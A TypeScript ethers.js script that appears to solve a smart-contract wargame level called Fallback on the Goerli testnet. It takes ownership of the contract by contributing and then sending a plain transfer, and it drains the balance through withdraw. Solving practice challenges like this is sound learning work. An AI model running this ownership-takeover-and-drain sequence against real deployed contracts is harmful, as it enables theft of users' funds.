import { ethers } from "ethers";
import { Fallback__factory } from '../typechain-types';

// Task:
// 1) claim ownership of the contract
// 2) reduce its balance to 0

const rpc = 'https://rpc.ankr.com/eth_goerli'
const privateKey = ''
const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    const contract = Fallback__factory.connect(instanceAddress, signer);

    console.log("Hacking the contract...");

    tx = await contract.connect(signer).contribute({ value: 1 });
    await tx.wait();

    tx = await signer.sendTransaction({
        to: contract.target,
        value: 1, 
    });
    await tx.wait();

    tx = await contract.withdraw();
    await tx.wait();

    const owner = await contract.owner();
    const contractBalance = await provider.getBalance(contract.target);

    console.log("Successfully hacked!");
    console.log("Contract owner:", owner);
    console.log("Contract balance:", contractBalance);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});